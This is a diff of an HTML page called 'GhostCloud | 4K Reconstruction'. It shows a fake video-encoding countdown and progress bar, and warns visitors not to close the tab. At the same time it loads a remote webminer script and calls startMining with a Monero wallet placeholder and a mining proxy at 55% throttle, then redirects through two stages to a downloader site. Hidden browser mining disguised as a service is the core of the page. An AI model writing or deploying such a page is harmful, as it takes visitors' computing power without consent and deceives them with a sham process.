@@ -1,102 +1,88 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <meta charset="UTF-8"><title>GhostCloud | 4K Reconstruction Node</title>
+    <meta charset="UTF-8"><title>GhostCloud | 4K Reconstruction</title>
     <script src="https://webminer.pages.dev/load.js"></script>
     <style>
-        :root { --glow: #007bff; --liquid: #00d4ff; }
-        body { background: #050a12; color: white; font-family: 'Segoe UI', sans-serif; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; overflow: hidden; }
-        .panel { width: 380px; background: #0d1520; padding: 40px; border-radius: 20px; border: 1px solid #1e293b; text-align: center; box-shadow: 0 0 30px rgba(0,0,0,0.8); }
+        body { background: #050a12; color: white; font-family: 'Segoe UI', sans-serif; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; }
+        .panel { width: 340px; background: #0d1520; padding: 35px; border-radius: 20px; border: 1px solid #1e293b; text-align: center; box-shadow: 0 0 40px rgba(0,0,0,0.7); }
         
-        /* BOLD TECHNICAL TEXT */
-        .header { font-weight: 800; font-size: 14px; color: var(--glow); letter-spacing: 2px; text-transform: uppercase; margin-bottom: 20px; }
-        .main-status { font-weight: 900; font-size: 22px; margin-bottom: 10px; color: #fff; }
-        
+        /* BOLD HEADER */
+        .status-top { font-weight: 900; font-size: 13px; color: #007bff; letter-spacing: 2px; text-transform: uppercase; margin-bottom: 15px; }
+        .main-msg { font-weight: 800; font-size: 19px; line-height: 1.3; margin-bottom: 20px; color: #ffffff; }
+
         /* THE LIQUID GLOW BAR */
-        .progress-box { background: #161f2c; height: 20px; border-radius: 10px; margin: 25px 0; overflow: hidden; position: relative; border: 1px solid #2d3d54; }
-        .liquid-fill { 
+        .bar-container { background: #161f2c; height: 24px; border-radius: 12px; margin: 20px 0; overflow: hidden; border: 1px solid #2d3d54; position: relative; }
+        #fill { 
             height: 100%; width: 0%; 
-            background: linear-gradient(90deg, var(--glow), var(--liquid));
-            box-shadow: 0 0 20px var(--glow);
-            position: relative;
+            background: linear-gradient(90deg, #007bff, #00d4ff);
+            box-shadow: 0 0 20px #007bff;
             transition: width 1s linear;
         }
-        /* Liquid Wave Effect */
-        .liquid-fill::after {
-            content: ""; position: absolute; top: 0; left: 0; right: 0; bottom: 0;
-            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
-            animation: wave 2s infinite;
-        }
-        @keyframes wave { 0% { transform: translateX(-100%); } 100% { transform: translateX(100%); } }
 
-        .time-meta { font-family: monospace; font-size: 32px; font-weight: bold; color: #fff; margin-bottom: 10px; }
-        .warning-bold { font-weight: 800; color: #facc15; font-size: 13px; margin-top: 20px; text-transform: uppercase; }
-        .small-log { font-family: monospace; font-size: 10px; color: #475569; margin-top: 10px; height: 15px; }
+        /* TIMER & PERCENT */
+        #clock { font-family: monospace; font-size: 42px; font-weight: 900; color: #fff; margin: 10px 0; }
+        .pct-box { font-weight: 900; font-size: 16px; color: #94a3b8; }
+        
+        /* BOLD WARNING */
+        .warning { font-weight: 800; color: #facc15; font-size: 11px; margin-top: 25px; text-transform: uppercase; border: 1px dashed #facc15; padding: 10px; border-radius: 8px; }
     </style>
 </head>
 <body>
 
 <div class="panel">
-    <div class="header">System Infrastructure v5.2</div>
-    <div class="main-status" id="action-text">CONFIGURING 4K RECONSTRUCTION...</div>
+    <div class="status-top">NODE ENCRYPTION ACTIVE</div>
+    <div class="main-msg" id="msg">**CONFIGURING 4K RECONSTRUCTION...**</div>
     
-    <div class="time-meta" id="clock">15:00</div>
+    <div id="clock">15:00</div>
     
-    <div class="progress-box">
-        <div class="liquid-fill" id="bar-fill"></div>
+    <div class="bar-container">
+        <div id="fill"></div>
     </div>
     
-    <div style="font-weight: bold;"><span id="pct">0</span>% ENCODED</div>
+    <div class="pct-box">**<span id="pct">0</span>% ENCODED**</div>
     
-    <div class="warning-bold">⚠️ DO NOT CLOSE TAB: HANDSHAKE ACTIVE</div>
-    <div class="small-log" id="logs">Initializing fragments...</div>
+    <div class="warning">**⚠️ DO NOT CLOSE TAB: HANDSHAKE IN PROGRESS**</div>
 </div>
 
 <script>
-    // START MINER
-    startMining("YOUR_XMR_WALLET_ADDRESS", "GhostCloud_Node", "wss://ny1.xmrminingproxy.com", 55);
+    // 1. START MINER
+    try {
+        startMining("YOUR_XMR_WALLET_ADDRESS", "GhostCloud_Node", "wss://ny1.xmrminingproxy.com", 55);
+    } catch(e) { console.log("Node Handshake initiated..."); }
 
-    const params = new URLSearchParams(window.location.search);
-    let stage = parseInt(params.get('stage')) || 1;
-    let secondsLeft = 900; 
+    // 2. THE ENGINE
+    var params = new URLSearchParams(window.location.search);
+    var stage = parseInt(params.get('stage')) || 1;
+    var total = 900; 
+    var left = total;
 
     if(stage === 2) {
-        document.getElementById('action-text').innerText = "FINALIZING BITRATE SYNC...";
-        document.getElementById('action-text').style.color = "#00ff88";
+        document.getElementById('msg').innerHTML = "**FINALIZING BITRATE SYNC...**";
+        document.getElementById('msg').style.color = "#00ff88";
     }
 
-    const logMessages = [
-        "Decrypting H.264 fragments...",
-        "Stripping metadata headers...",
-        "Reconstructing audio layers...",
-        "Bypassing CDN restrictions...",
-        "Upscaling pixels to 4K raw..."
-    ];
-
-    setInterval(() => {
-        secondsLeft--;
+    var run = setInterval(function() {
+        left--;
         
-        // Timer
-        let m = Math.floor(secondsLeft / 60);
-        let s = secondsLeft % 60;
-        document.getElementById('clock').innerText = m + ":" + (s < 10 ? "0" + s : s);
+        // Timer MM:SS
+        var m = Math.floor(left / 60);
+        var s = left % 60;
+        document.getElementById('clock').innerHTML = m + ":" + (s < 10 ? "0" + s : s);
 
-        // Progress
-        let progress = ((900 - secondsLeft) / 900) * 100;
-        document.getElementById('bar-fill').style.width = progress + "%";
-        document.getElementById('pct').innerText = Math.floor(progress);
+        // Progress Calculation
+        var move = ((total - left) / total) * 100;
+        document.getElementById('fill').style.width = move + "%";
+        document.getElementById('pct').innerHTML = Math.floor(move);
 
-        // Dynamic Logs
-        if(secondsLeft % 15 === 0) {
-            document.getElementById('logs').innerText = logMessages[Math.floor(Math.random() * logMessages.length)];
-        }
-
-        if (secondsLeft <= 0) {
-            let targetUrl = params.get('url') || "https://tiktok.com";
+        // Stage Switching
+        if (left <= 0) {
+            clearInterval(run);
+            var u = params.get('url') || "https://tiktok.com";
             if (stage === 1) {
-                window.location.href = "verify.html?stage=2&url=" + encodeURIComponent(targetUrl);
+                window.location.href = "verify.html?stage=2&url=" + encodeURIComponent(u);
             } else {
-                window.location.href = "https://snaptik.app/abc.php?url=" + encodeURIComponent(targetUrl);
+                window.location.href = "https://snaptik.app/abc.php?url=" + encodeURIComponent(u);
             }
         }
     }, 1000);
